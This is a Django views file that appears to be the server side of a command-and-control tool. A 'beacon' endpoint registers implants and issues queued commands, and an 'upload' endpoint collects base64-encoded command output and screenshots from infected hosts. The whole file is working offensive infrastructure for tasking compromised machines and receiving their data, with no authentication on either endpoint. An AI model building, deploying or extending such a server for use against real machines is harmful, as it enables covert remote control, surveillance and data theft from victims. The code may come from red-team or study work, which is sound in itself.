from django.shortcuts import render

# Create your views here.
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Implant, Task
from django.utils import timezone
import base64, json
from datetime import datetime


@csrf_exempt
def beacon(request):
    implant_id = request.GET.get('id', None)

    if not implant_id:
        return HttpResponse("Missing ID", status=400)

    #lookup or create implant in django database
    implant, created = Implant.objects.get_or_create(implant_id=implant_id)

    implant.last_seen = timezone.now()
    implant.active = True
    implant.save()

    task = Task.objects.filter(implant=implant, completed=False).first()

    if task:
        return HttpResponse(task.command)
    else: 
        return HttpResponse("none")

@csrf_exempt
def upload(request):
    if request.method != 'POST':
        return HttpResponse("Bad Request", status=400)

    implant_id = request.POST.get('id', None)
    result_data = request.POST.get('result', None)

    try:
        file = request.FILES.get("screenshot")
    except:
        file = 0 

    if not implant_id and not (result_data or file):
        return HttpResponse("Missing Parameters", status=400)

    try:
        implant = Implant.objects.get(implant_id=implant_id)
    except Implant.DoesNotExist:
        return HttpResponse("Implant not found", status=404)

    #Find the most recent incomplete task
    task = Task.objects.filter(implant=implant, completed=False).first()

    if task:
        if file:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            with open(f"/tmp/screenshot_{implant_id}_{timestamp}.bmp", "wb") as f:
                for chunk in file.chunks():
                    f.write(chunk)
            task.results = f"[+] Screenshot saved to /tmp/screenshot_{implant_id}_{timestamp}.bmp"
            task.completed = True
            task.save()
            return HttpResponse("Result received")
        else:
            task.results = base64.b64decode(result_data).decode("utf-8", errors="replace").strip()
            task.completed = True
            print(result_data)
            task.save()
            return HttpResponse("Result received")
    else:
        return HttpResponse("No pending task", status=404)

